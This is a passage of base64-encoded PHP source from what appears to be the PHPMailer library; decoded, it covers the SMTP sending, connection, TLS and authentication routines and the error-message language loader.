TVRQLgogICAgICogUmV0dXJucyBmYWxzZSBpZiB0aGVyZSBpcyBhIGJhZCBNQUlMIEZST00sIFJDUFQsIG9yIERBVEEgaW5wdXQuCiAgICAgKiBVc2VzIHRoZSBQSFBNYWlsZXJTTVRQIGNsYXNzIGJ5IGRlZmF1bHQuCiAgICAgKiBAc2VlIFBIUE1haWxlcjo6Z2V0U01UUEluc3RhbmNlKCkgdG8gdXNlIGEgZGlmZmVyZW50IGNsYXNzLgogICAgICogQHBhcmFtIHN0cmluZyAkaGVhZGVyIFRoZSBtZXNzYWdlIGhlYWRlcnMKICAgICAqIEBwYXJhbSBzdHJpbmcgJGJvZHkgVGhlIG1lc3NhZ2UgYm9keQogICAgICogQHRocm93cyBwaHBtYWlsZXJFeGNlcHRpb24KICAgICAqIEB1c2VzIFNNVFAKICAgICAqIEBhY2Nlc3MgcHJvdGVjdGVkCiAgICAgKiBAcmV0dXJuIGJvb2xlYW4KICAgICAqLwogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIHNtdHBTZW5kKCRoZWFkZXIsICRib2R5KQogICAgewogICAgICAgICRiYWRfcmNwdCA9IGFycmF5KCk7CiAgICAgICAgaWYgKCEkdGhpcy0+c210cENvbm5lY3QoJHRoaXMtPlNNVFBPcHRpb25zKSkgewogICAgICAgICAgICB0aHJvdyBuZXcgcGhwbWFpbGVyRXhjZXB0aW9uKCR0aGlzLT5sYW5nKCdzbXRwX2Nvbm5lY3RfZmFpbGVkJyksIHNlbGY6OlNUT1BfQ1JJVElDQUwpOwogICAgICAgIH0KICAgICAgICBpZiAoIWVtcHR5KCR0aGlzLT5TZW5kZXIpIGFuZCAkdGhpcy0+dmFsaWRhdGVBZGRyZXNzKCR0aGlzLT5TZW5kZXIpKSB7CiAgICAgICAgICAgICRzbXRwX2Zyb20gPSAkdGhpcy0+U2VuZGVyOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICRzbXRwX2Zyb20gPSAkdGhpcy0+RnJvbTsKICAgICAgICB9CiAgICAgICAgaWYgKCEkdGhpcy0+c210cC0+bWFpbCgkc210cF9mcm9tKSkgewogICAgICAgICAgICAkdGhpcy0+c2V0RXJyb3IoJHRoaXMtPmxhbmcoJ2Zyb21fZmFpbGVkJykgLiAkc210cF9mcm9tIC4gJyA6ICcgLiBpbXBsb2RlKCcsJywgJHRoaXMtPnNtdHAtPmdldEVycm9yKCkpKTsKICAgICAgICAgICAgdGhyb3cgbmV3IHBocG1haWxlckV4Y2VwdGlvbigkdGhpcy0+RXJyb3JJbmZvLCBzZWxmOjpTVE9QX0NSSVRJQ0FMKTsKICAgICAgICB9CgogICAgICAgIC8vIEF0dGVtcHQgdG8gc2VuZCB0byBhbGwgcmVjaXBpZW50cwogICAgICAgIGZvcmVhY2ggKGFycmF5KCR0aGlzLT50bywgJHRoaXMtPmNjLCAkdGhpcy0+YmNjKSBhcyAkdG9ncm91cCkgewogICAgICAgICAgICBmb3JlYWNoICgkdG9ncm91cCBhcyAkdG8pIHsKICAgICAgICAgICAgICAgIGlmICghJHRoaXMtPnNtdHAtPnJlY2lwaWVudCgkdG9bMF0pKSB7CiAgICAgICAgICAgICAgICAgICAgJGVycm9yID0gJHRoaXMtPnNtdHAtPmdldEVycm9yKCk7CiAgICAgICAgICAgICAgICAgICAgJGJhZF9yY3B0W10gPSBhcnJheSgndG8nID0+ICR0b1swXSwgJ2Vycm9yJyA9PiAkZXJyb3JbJ2RldGFpbCddKTsKICAgICAgICAgICAgICAgICAgICAkaXNTZW50ID0gZmFsc2U7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgICRpc1NlbnQgPSB0cnVlOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgJHRoaXMtPmRvQ2FsbGJhY2soJGlzU2VudCwgYXJyYXkoJHRvWzBdKSwgYXJyYXkoKSwgYXJyYXkoKSwgJHRoaXMtPlN1YmplY3QsICRib2R5LCAkdGhpcy0+RnJvbSk7CiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgIC8vIE9ubHkgc2VuZCB0aGUgREFUQSBjb21tYW5kIGlmIHdlIGhhdmUgdmlhYmxlIHJlY2lwaWVudHMKICAgICAgICBpZiAoKGNvdW50KCR0aGlzLT5hbGxfcmVjaXBpZW50cykgPiBjb3VudCgkYmFkX3JjcHQpKSBhbmQgISR0aGlzLT5zbXRwLT5kYXRhKCRoZWFkZXIgLiAkYm9keSkpIHsKICAgICAgICAgICAgdGhyb3cgbmV3IHBocG1haWxlckV4Y2VwdGlvbigkdGhpcy0+bGFuZygnZGF0YV9ub3RfYWNjZXB0ZWQnKSwgc2VsZjo6U1RPUF9DUklUSUNBTCk7CiAgICAgICAgfQogICAgICAgIGlmICgkdGhpcy0+U01UUEtlZXBBbGl2ZSkgewogICAgICAgICAgICAkdGhpcy0+c210cC0+cmVzZXQoKTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAkdGhpcy0+c210cC0+cXVpdCgpOwogICAgICAgICAgICAkdGhpcy0+c210cC0+Y2xvc2UoKTsKICAgICAgICB9CiAgICAgICAgLy9DcmVhdGUgZXJyb3IgbWVzc2FnZSBmb3IgYW55IGJhZCBhZGRyZXNzZXMKICAgICAgICBpZiAoY291bnQoJGJhZF9yY3B0KSA+IDApIHsKICAgICAgICAgICAgJGVycnN0ciA9ICcnOwogICAgICAgICAgICBmb3JlYWNoICgkYmFkX3JjcHQgYXMgJGJhZCkgewogICAgICAgICAgICAgICAgJGVycnN0ciAuPSAkYmFkWyd0byddIC4gJzogJyAuICRiYWRbJ2Vycm9yJ107CiAgICAgICAgICAgIH0KICAgICAgICAgICAgdGhyb3cgbmV3IHBocG1haWxlckV4Y2VwdGlvbigKICAgICAgICAgICAgICAgICR0aGlzLT5sYW5nKCdyZWNpcGllbnRzX2ZhaWxlZCcpIC4gJGVycnN0ciwKICAgICAgICAgICAgICAgIHNlbGY6OlNUT1BfQ09OVElOVUUKICAgICAgICAgICAgKTsKICAgICAgICB9CiAgICAgICAgcmV0dXJuIHRydWU7CiAgICB9CgogICAgLyoqCiAgICAgKiBJbml0aWF0ZSBhIGNvbm5lY3Rpb24gdG8gYW4gU01UUCBzZXJ2ZXIuCiAgICAgKiBSZXR1cm5zIGZhbHNlIGlmIHRoZSBvcGVyYXRpb24gZmFpbGVkLgogICAgICogQHBhcmFtIGFycmF5ICRvcHRpb25zIEFuIGFycmF5IG9mIG9wdGlvbnMgY29tcGF0aWJsZSB3aXRoIHN0cmVhbV9jb250ZXh0X2NyZWF0ZSgpCiAgICAgKiBAdXNlcyBTTVRQCiAgICAgKiBAYWNjZXNzIHB1YmxpYwogICAgICogQHRocm93cyBwaHBtYWlsZXJFeGNlcHRpb24KICAgICAqIEByZXR1cm4gYm9vbGVhbgogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gc210cENvbm5lY3QoJG9wdGlvbnMgPSBudWxsKQogICAgewogICAgICAgIGlmIChpc19udWxsKCR0aGlzLT5zbXRwKSkgewogICAgICAgICAgICAkdGhpcy0+c210cCA9ICR0aGlzLT5nZXRTTVRQSW5zdGFuY2UoKTsKICAgICAgICB9CgogICAgICAgIC8vSWYgbm8gb3B0aW9ucyBhcmUgcHJvdmlkZWQsIHVzZSB3aGF0ZXZlciBpcyBzZXQgaW4gdGhlIGluc3RhbmNlCiAgICAgICAgaWYgKGlzX251bGwoJG9wdGlvbnMpKSB7CiAgICAgICAgICAgICRvcHRpb25zID0gJHRoaXMtPlNNVFBPcHRpb25zOwogICAgICAgIH0KCiAgICAgICAgLy8gQWxyZWFkeSBjb25uZWN0ZWQ/CiAgICAgICAgaWYgKCR0aGlzLT5zbXRwLT5jb25uZWN0ZWQoKSkgewogICAgICAgICAgICByZXR1cm4gdHJ1ZTsKICAgICAgICB9CgogICAgICAgICR0aGlzLT5zbXRwLT5zZXRUaW1lb3V0KCR0aGlzLT5UaW1lb3V0KTsKICAgICAgICAkdGhpcy0+c210cC0+c2V0RGVidWdMZXZlbCgkdGhpcy0+U01UUERlYnVnKTsKICAgICAgICAkdGhpcy0+c210cC0+c2V0RGVidWdPdXRwdXQoJHRoaXMtPkRlYnVnb3V0cHV0KTsKICAgICAgICAkdGhpcy0+c210cC0+c2V0VmVycCgkdGhpcy0+ZG9fdmVycCk7CiAgICAgICAgJGhvc3RzID0gZXhwbG9kZSgnOycsICR0aGlzLT5Ib3N0KTsKICAgICAgICAkbGFzdGV4Y2VwdGlvbiA9IG51bGw7CgogICAgICAgIGZvcmVhY2ggKCRob3N0cyBhcyAkaG9zdGVudHJ5KSB7CiAgICAgICAgICAgICRob3N0aW5mbyA9IGFycmF5KCk7CiAgICAgICAgICAgIGlmICghcHJlZ19tYXRjaCgKICAgICAgICAgICAgICAgICcvXigoc3NsfHRscyk6XC9cLykqKFthLXpBLVowLTlcLi1dKnxcW1thLWZBLUYwLTk6XStcXSk6PyhbMC05XSopJC8nLAogICAgICAgICAgICAgICAgdHJpbSgkaG9zdGVudHJ5KSwKICAgICAgICAgICAgICAgICRob3N0aW5mbwogICAgICAgICAgICApKSB7CiAgICAgICAgICAgICAgICAvLyBOb3QgYSB2YWxpZCBob3N0IGVudHJ5CiAgICAgICAgICAgICAgICAkdGhpcy0+ZWRlYnVnKCdJZ25vcmluZyBpbnZhbGlkIGhvc3Q6ICcgLiAkaG9zdGVudHJ5KTsKICAgICAgICAgICAgICAgIGNvbnRpbnVlOwogICAgICAgICAgICB9CiAgICAgICAgICAgIC8vICRob3N0aW5mb1syXTogb3B0aW9uYWwgc3NsIG9yIHRscyBwcmVmaXgKICAgICAgICAgICAgLy8gJGhvc3RpbmZvWzNdOiB0aGUgaG9zdG5hbWUKICAgICAgICAgICAgLy8gJGhvc3RpbmZvWzRdOiBvcHRpb25hbCBwb3J0IG51bWJlcgogICAgICAgICAgICAvLyBUaGUgaG9zdCBzdHJpbmcgcHJlZml4IGNhbiB0ZW1wb3JhcmlseSBvdmVycmlkZSB0aGUgY3VycmVudCBzZXR0aW5nIGZvciBTTVRQU2VjdXJlCiAgICAgICAgICAgIC8vIElmIGl0J3Mgbm90IHNwZWNpZmllZCwgdGhlIGRlZmF1bHQgdmFsdWUgaXMgdXNlZAogICAgICAgICAgICAkcHJlZml4ID0gJyc7CiAgICAgICAgICAgICRzZWN1cmUgPSAkdGhpcy0+U01UUFNlY3VyZTsKICAgICAgICAgICAgJHRscyA9ICgkdGhpcy0+U01UUFNlY3VyZSA9PSAndGxzJyk7CiAgICAgICAgICAgIGlmICgnc3NsJyA9PSAkaG9zdGluZm9bMl0gb3IgKCcnID09ICRob3N0aW5mb1syXSBhbmQgJ3NzbCcgPT0gJHRoaXMtPlNNVFBTZWN1cmUpKSB7CiAgICAgICAgICAgICAgICAkcHJlZml4ID0gJ3NzbDovLyc7CiAgICAgICAgICAgICAgICAkdGxzID0gZmFsc2U7IC8vIENhbid0IGhhdmUgU1NMIGFuZCBUTFMgYXQgdGhlIHNhbWUgdGltZQogICAgICAgICAgICAgICAgJHNlY3VyZSA9ICdzc2wnOwogICAgICAgICAgICB9IGVsc2VpZiAoJGhvc3RpbmZvWzJdID09ICd0bHMnKSB7CiAgICAgICAgICAgICAgICAkdGxzID0gdHJ1ZTsKICAgICAgICAgICAgICAgIC8vIHRscyBkb2Vzbid0IHVzZSBhIHByZWZpeAogICAgICAgICAgICAgICAgJHNlY3VyZSA9ICd0bHMnOwogICAgICAgICAgICB9CiAgICAgICAgICAgIC8vRG8gd2UgbmVlZCB0aGUgT3BlblNTTCBleHRlbnNpb24/CiAgICAgICAgICAgICRzc2xleHQgPSBkZWZpbmVkKCdPUEVOU1NMX0FMR09fU0hBMScpOwogICAgICAgICAgICBpZiAoJ3RscycgPT09ICRzZWN1cmUgb3IgJ3NzbCcgPT09ICRzZWN1cmUpIHsKICAgICAgICAgICAgICAgIC8vQ2hlY2sgZm9yIGFuIE9wZW5TU0wgY29uc3RhbnQgcmF0aGVyIHRoYW4gdXNpbmcgZXh0ZW5zaW9uX2xvYWRlZCwgd2hpY2ggaXMgc29tZXRpbWVzIGRpc2FibGVkCiAgICAgICAgICAgICAgICBpZiAoISRzc2xleHQpIHsKICAgICAgICAgICAgICAgICAgICB0aHJvdyBuZXcgcGhwbWFpbGVyRXhjZXB0aW9uKCR0aGlzLT5sYW5nKCdleHRlbnNpb25fbWlzc2luZycpLidvcGVuc3NsJywgc2VsZjo6U1RPUF9DUklUSUNBTCk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgJGhvc3QgPSAkaG9zdGluZm9bM107CiAgICAgICAgICAgICRwb3J0ID0gJHRoaXMtPlBvcnQ7CiAgICAgICAgICAgICR0cG9ydCA9IChpbnRlZ2VyKSRob3N0aW5mb1s0XTsKICAgICAgICAgICAgaWYgKCR0cG9ydCA+IDAgYW5kICR0cG9ydCA8IDY1NTM2KSB7CiAgICAgICAgICAgICAgICAkcG9ydCA9ICR0cG9ydDsKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoJHRoaXMtPnNtdHAtPmNvbm5lY3QoJHByZWZpeCAuICRob3N0LCAkcG9ydCwgJHRoaXMtPlRpbWVvdXQsICRvcHRpb25zKSkgewogICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICBpZiAoJHRoaXMtPkhlbG8pIHsKICAgICAgICAgICAgICAgICAgICAgICAgJGhlbGxvID0gJHRoaXMtPkhlbG87CiAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgJGhlbGxvID0gJHRoaXMtPnNlcnZlckhvc3RuYW1lKCk7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICR0aGlzLT5zbXRwLT5oZWxsbygkaGVsbG8pOwogICAgICAgICAgICAgICAgICAgIC8vQXV0b21hdGljYWxseSBlbmFibGUgVExTIGVuY3J5cHRpb24gaWY6CiAgICAgICAgICAgICAgICAgICAgLy8gKiBpdCdzIG5vdCBkaXNhYmxlZAogICAgICAgICAgICAgICAgICAgIC8vICogd2UgaGF2ZSBvcGVuc3NsIGV4dGVuc2lvbgogICAgICAgICAgICAgICAgICAgIC8vICogd2UgYXJlIG5vdCBhbHJlYWR5IHVzaW5nIFNTTAogICAgICAgICAgICAgICAgICAgIC8vICogdGhlIHNlcnZlciBvZmZlcnMgU1RBUlRUTFMKICAgICAgICAgICAgICAgICAgICBpZiAoJHRoaXMtPlNNVFBBdXRvVExTIGFuZCAkc3NsZXh0IGFuZCAkc2VjdXJlICE9ICdzc2wnIGFuZCAkdGhpcy0+c210cC0+Z2V0U2VydmVyRXh0KCdTVEFSVFRMUycpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICR0bHMgPSB0cnVlOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBpZiAoJHRscykgewogICAgICAgICAgICAgICAgICAgICAgICBpZiAoISR0aGlzLT5zbXRwLT5zdGFydFRMUygpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0aHJvdyBuZXcgcGhwbWFpbGVyRXhjZXB0aW9uKCR0aGlzLT5sYW5nKCdjb25uZWN0X2hvc3QnKSk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgLy8gV2UgbXVzdCByZXNlbmQgRUhMTyBhZnRlciBUTFMgbmVnb3RpYXRpb24KICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPnNtdHAtPmhlbGxvKCRoZWxsbyk7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGlmICgkdGhpcy0+U01UUEF1dGgpIHsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCEkdGhpcy0+c210cC0+YXV0aGVudGljYXRlKAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPlVzZXJuYW1lLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPlBhc3N3b3JkLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPkF1dGhUeXBlLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPlJlYWxtLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPldvcmtzdGF0aW9uCiAgICAgICAgICAgICAgICAgICAgICAgICkKICAgICAgICAgICAgICAgICAgICAgICAgKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0aHJvdyBuZXcgcGhwbWFpbGVyRXhjZXB0aW9uKCR0aGlzLT5sYW5nKCdhdXRoZW50aWNhdGUnKSk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHRydWU7CiAgICAgICAgICAgICAgICB9IGNhdGNoIChwaHBtYWlsZXJFeGNlcHRpb24gJGV4YykgewogICAgICAgICAgICAgICAgICAgICRsYXN0ZXhjZXB0aW9uID0gJGV4YzsKICAgICAgICAgICAgICAgICAgICAkdGhpcy0+ZWRlYnVnKCRleGMtPmdldE1lc3NhZ2UoKSk7CiAgICAgICAgICAgICAgICAgICAgLy8gV2UgbXVzdCBoYXZlIGNvbm5lY3RlZCwgYnV0IHRoZW4gZmFpbGVkIFRMUyBvciBBdXRoLCBzbyBjbG9zZSBjb25uZWN0aW9uIG5pY2VseQogICAgICAgICAgICAgICAgICAgICR0aGlzLT5zbXRwLT5xdWl0KCk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgLy8gSWYgd2UgZ2V0IGhlcmUsIGFsbCBjb25uZWN0aW9uIGF0dGVtcHRzIGhhdmUgZmFpbGVkLCBzbyBjbG9zZSBjb25uZWN0aW9uIGhhcmQKICAgICAgICAkdGhpcy0+c210cC0+Y2xvc2UoKTsKICAgICAgICAvLyBBcyB3ZSd2ZSBjYXVnaHQgYWxsIGV4Y2VwdGlvbnMsIGp1c3QgcmVwb3J0IHdoYXRldmVyIHRoZSBsYXN0IG9uZSB3YXMKICAgICAgICBpZiAoJHRoaXMtPmV4Y2VwdGlvbnMgYW5kICFpc19udWxsKCRsYXN0ZXhjZXB0aW9uKSkgewogICAgICAgICAgICB0aHJvdyAkbGFzdGV4Y2VwdGlvbjsKICAgICAgICB9CiAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgfQoKICAgIC8qKgogICAgICogQ2xvc2UgdGhlIGFjdGl2ZSBTTVRQIHNlc3Npb24gaWYgb25lIGV4aXN0cy4KICAgICAqIEByZXR1cm4gdm9pZAogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gc210cENsb3NlKCkKICAgIHsKICAgICAgICBpZiAoaXNfYSgkdGhpcy0+c210cCwgJ1NNVFAnKSkgewogICAgICAgICAgICBpZiAoJHRoaXMtPnNtdHAtPmNvbm5lY3RlZCgpKSB7CiAgICAgICAgICAgICAgICAkdGhpcy0+c210cC0+cXVpdCgpOwogICAgICAgICAgICAgICAgJHRoaXMtPnNtdHAtPmNsb3NlKCk7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9CgogICAgLyoqCiAgICAgKiBTZXQgdGhlIGxhbmd1YWdlIGZvciBlcnJvciBtZXNzYWdlcy4KICAgICAqIFJldHVybnMgZmFsc2UgaWYgaXQgY2Fubm90IGxvYWQgdGhlIGxhbmd1YWdlIGZpbGUuCiAgICAgKiBUaGUgZGVmYXVsdCBsYW5ndWFnZSBpcyBFbmdsaXNoLgogICAgICogQHBhcmFtIHN0cmluZyAkbGFuZ2NvZGUgSVNPIDYzOS0xIDItY2hhcmFjdGVyIGxhbmd1YWdlIGNvZGUgKGUuZy4gRnJlbmNoIGlzICJmciIpCiAgICAgKiBAcGFyYW0gc3RyaW5nICRsYW5nX3BhdGggUGF0aCB0byB0aGUgbGFuZ3VhZ2UgZmlsZSBkaXJlY3RvcnksIHdpdGggdHJhaWxpbmcgc2VwYXJhdG9yIChzbGFzaCkKICAgICAqIEByZXR1cm4gYm9vbGVhbgogICAgICogQGFjY2VzcyBwdWJsaWMKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIHNldExhbmd1YWdlKCRsYW5nY29kZSA9ICdlbicsICRsYW5nX3BhdGggPSAnJykKICAgIHsKICAgICAgICAvLyBCYWNrd2FyZHMgY29tcGF0aWJpbGl0eSBmb3IgcmVuYW1lZCBsYW5ndWFnZSBjb2RlcwogICAgICAgICRyZW5hbWVkX2xhbmdjb2RlcyA9IGFycmF5KAogICAgICAgICAgICAnYnInID0+ICdwdF9icicsCiAgICAgICAgICAgICdjeicgPT4gJ2NzJywKICAgICAgICAgICAgJ2RrJyA9PiAnZGEnLAogICAgICAgICAgICAnbm8nID0+ICduYicsCiAgICAgICAgICAgICdzZScgPT4gJ3N2JywKICAgICAgICAgICAgJ3NyJyA9PiAncnMnCiAgICAgICAgKTsKCiAgICAgICAgaWYgKGlzc2V0KCRyZW5hbWVkX2xhbmdjb2Rlc1skbGFuZ2NvZGVdKSkgewogICAgICAgICAgICAkbGFuZ2NvZGUgPSAkcmVuYW1lZF9sYW5nY29kZXNbJGxhbmdjb2RlXTsKICAgICAgICB9CgogICAgICAgIC8vIERlZmluZSBmdWxsIHNldCBvZiB0cmFuc2xhdGFibGUgc3RyaW5ncyBpbiBFbmdsaXNoCiAgICAgICAgJFBIUE1BSUxFUl9MQU5HID0gYXJyYXkoCiAgICAgICAgICAgICdhdXRoZW50aWNhdGUnID0+ICdTTVRQIEVycm9yOiBDb3VsZCBub3QgYXV0aGVudGljYXRlLicsCiAgICAgICAgICAgICdjb25uZWN0X2hvc3QnID0+ICdTTVRQIEVycm9yOiBDb3VsZCBub3QgY29ubmVjdCB0byBTTVRQIGhvc3QuJywKICAgICAgICAgICAgJ2RhdGFfbm90X2FjY2VwdGVkJyA9PiAnU01UUCBFcnJvcjogZGF0YSBub3QgYWNjZXB0ZWQuJywKICAgICAgICAgICAgJ2VtcHR5X21lc3NhZ2UnID0+ICdNZXNzYWdlIGJvZHkgZW1wdHknLAogICAgICAgICAgICAnZW5jb2RpbmcnID0+ICdVbmtub3duIGVuY29kaW5nOiAnLAogICAgICAgICAgICAnZXhlY3V0ZScgPT4gJ0NvdWxkIG5vdCBleGVjdXRlOiAnLAogICAgICAgICAgICAnZmlsZV9hY2Nlc3MnID0+ICdDb3VsZCBub3QgYWNjZXNzIGZpbGU6ICcsCiAgICAgICAgICAgICdmaWxlX29wZW4nID0+ICdGaWxlIEVycm9yOiBDb3VsZCBub3Qgb3BlbiBmaWxlOiAnLAogICAgICAgICAgICAnZnJvbV9mYWlsZWQnID0+ICdUaGUgZm9sbG93aW5nIEZyb20gYWRkcmVzcyBmYWlsZWQ6ICcsCiAgICAgICAgICAgICdpbnN0YW50aWF0ZScgPT4gJ0NvdWxkIG5vdCBpbnN0YW50aWF0ZSBtYWlsIGZ1bmN0aW9uLicsCiAgICAgICAgICAgICdpbnZhbGlkX2FkZHJlc3MnID0+ICdJbnZhbGlkIGFkZHJlc3M6ICcsCiAgICAgICAgICAgICdtYWlsZXJfbm90X3N1cHBvcnRlZCcgPT4gJyBtYWlsZXIgaXMgbm90IHN1cHBvcnRlZC4nLAogICAgICAgICAgICAncHJvdmlkZV9hZGRyZXNzJyA9PiAnWW91IG11c3QgcHJvdmlkZSBhdCBsZWFzdCBvbmUgcmVjaXBpZW50IGVtYWlsIGFkZHJlc3MuJywKICAgICAgICAgICAgJ3JlY2lwaWVudHNfZmFpbGVkJyA9PiAnU01UUCBFcnJvcjogVGhlIGZvbGxvd2luZyByZWNpcGllbnRzIGZhaWxlZDogJywKICAgICAgICAgICAgJ3NpZ25pbmcnID0+ICdTaWduaW5nIEVycm9yOiAnLAogICAgICAgICAgICAnc210cF9jb25uZWN0X2ZhaWxlZCcgPT4gJ1NNVFAgY29ubmVjdCgpIGZhaWxlZC4nLAogICAgICAgICAgICAnc210cF9lcnJvcicgPT4gJ1NNVFAgc2VydmVyIGVycm9yOiAnLAogICAgICAgICAgICAndmFyaWFibGVfc2V0JyA9PiAnQ2Fubm90IHNldCBvciByZXNldCB2YXJpYWJsZTogJywKICAgICAgICAgICAgJ2V4dGVuc2lvbl9taXNzaW5nJyA9PiAnRXh0ZW5zaW9uIG1pc3Npbmc6ICcKICAgICAgICApOwogICAgICAgIGlmIChlbXB0eSgkbGFuZ19wYXRoKSkgewogICAgICAgICAgICAvLyBDYWxjdWxhdGUgYW4gYWJzb2x1dGUgcGF0aCBzbyBpdCBjYW4gd29yayBpZiBDV0QgaXMgbm90IGhlcmUKICAgICAgICAgICAgJGxhbmdfcGF0aCA9IGRpcm5hbWUoX19GSUxFX18pLiBESVJFQ1RPUllfU0VQQVJBVE9SIC4gJ2xhbmd1YWdlJy4gRElSRUNUT1JZX1NFUEFSQVRPUjsKICAgICAgICB9CiAgICAgICAgLy9WYWxpZGF0ZSAkbGFuZ2NvZGUKICAgICAgICBpZiAoIXByZWdfbWF0Y2goJy9eW2Etel17Mn0oPzpfW2EtekEtWl17Mn0pPyQvJywgJGxhbmdjb2RlKSkgewogICAgICAgICAgICAkbGFuZ2NvZGUgPSAnZW4nOwogICAgICAgIH0KICAgICAgICAkZm91bmRsYW5nID0gdHJ1ZTsKICAgICAgICAkbGFuZ19maWxlID0gJGxhbmdfcGF0aCAuICdwaHBtYWlsZXIubGFuZy0nIC4gJGxhbmdjb2RlIC4gJy5waHAnOwogICAgICAgIC8vIFRoZXJlIGlzIG5vIEVuZ2xpc2ggdHJhbnNsYXRpb24gZmlsZQogICAgICAgIGlmICgkbGFuZ2NvZGUgIT0gJ2VuJykgewogICAgICAgICAgICAvLyBNYWtlIHN1cmUgbGFuZ3VhZ2UgZmlsZSBwYXRoIGlzIHJlYWRhYmxlCiAgICAgICAgICAgIGlmICghc2VsZjo6aXNQZXJtaXR0ZWRQYXRoKCRsYW5nX2ZpbGUpIG9yICFpc19yZWFkYWJsZSgkbGFuZ19maWxlKSkgewogICAgICAgICAgICAgICAgJGZvdW5kbGFuZyA9IGZhbHNlOwogICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgLy8gT3ZlcndyaXRlIGxhbmd1YWdlLXNwZWNpZmljIHN0cmluZ3MuCiAgICAgICAgICAgICAgICAvLyBUaGlzIHdheSB3ZSdsbCBuZXZlciBoYXZlIG1pc3NpbmcgdHJhbnNsYXRpb24ga2V5cy4KICAgICAgICAgICAgICAgICRmb3VuZGxhbmcgPSBpbmNsdWRlICRsYW5nX2ZpbGU7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgJHRoaXMtPmxhbmd1YWdlID0gJFBIUE1BSUxFUl9MQU5HOwogICAgICAgIHJldHVybiAoYm9vbGVhbikkZm91bmRsYW5nOyAvLyBSZXR1cm5zIGZhbHNlIGlmIGxhbmd1YWdlIG5vdCBmb3VuZAogICAgfQoKICAgIC8qKgogICAgICogR2V0IHRoZSBhcnJheSBvZiBzdHJpbmdzIGZvciB0aGUgY3VycmVudCBsYW5ndWFnZS4KICAgICAqIEByZXR1cm4gYXJyYXkKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGdldFRyYW5zbGF0aW9ucygpCiAgICB7CiAgICAgICAgcmV0dXJuICR0aGlzLT5sYW5ndWFnZTsKICAgIH0KCiAgICAvKioKICAgICAqIENyZWF0ZSByZWNpcGllbnQgaGVhZGVycy4KICAgICAqIEBhY2Nlc3MgcHVibGljCiAgICAgKiBAcGFyYW0gc3RyaW5nICR0eXBlCiAgICAgKiBAcGFyYW0gYXJyYXkgJGFkZHIgQW4gYXJyYXkgb2YgcmVjaXBpZW50LAogICAgICogd2hlcmUgZWFjaCByZWNpcGllbnQgaXMgYSAyLWVsZW1lbnQgaW5kZXhlZCBhcnJheSB3aXRoIGVsZW1lbnQgMCBjb250YWluaW5nIGFuIGFkZHJlc3MKICAgICAqIGFuZCBlbGVtZW50IDEgY29udGFpbmluZyBhIG5hbWUsIGxpa2U6CiAgICAgKiBhcnJheShhcnJheSgnam9lQGV4YW1wbGUuY29tJywgJ0pvZSBVc2VyJyksIGFycmF5KCd6b2VAZXhhbXBsZS5jb20nLCAnWm9lIFVzZXInKSkKICAgICAqIEByZXR1cm4gc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBhZGRyQXBwZW5kKCR0eXBlLCAkYWRkcikKICAgIHsKICAgICAgICAkYWRkcmVzc2VzID0gYXJyYXkoKTsKICAgICAgICBmb3JlYWNoICgkYWRkciBhcyAkYWRkcmVzcykgewogICAgICAgICAgICAkYWRkcmVzc2VzW10gPSAkdGhpcy0+YWRkckZvcm1hdCgkYWRkcmVzcyk7CiAgICAgICAgfQogICAgICAgIHJldHVybiAkdHlwZSAuICc6ICcgLiBpbXBsb2RlKCcsICcsICRhZGRyZXNzZXMpIC4gJHRoaXMtPkxFOwogICAgfQoKICAgIC8qKgogICAgICogRm9ybWF0IGFuIGFkZHJlc3MgZm9yIHVzZSBpbiBhIG1lc3NhZ2UgaGVhZGVyLgogICAgICogQGFjY2VzcyBwdWJsaWMKICAgICAqIEBwYXJhbSBhcnJheSAkYWRkciBBIDItZWxlbWVudCBpbmRleGVkIGFycmF5LCBlbGVtZW50IDAgY29udGFpbmluZyBhbiBhZGRyZXNzLCBlbGVtZW50IDEgY29udGFpbmluZyBhIG5hbWUKICAgICAqICAgICAgbGlrZSBhcnJheSgnam9lQGV4YW1wbGUuY29tJywgJ0pvZSBVc2VyJykKICAgICAqIEByZXR1cm4gc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiB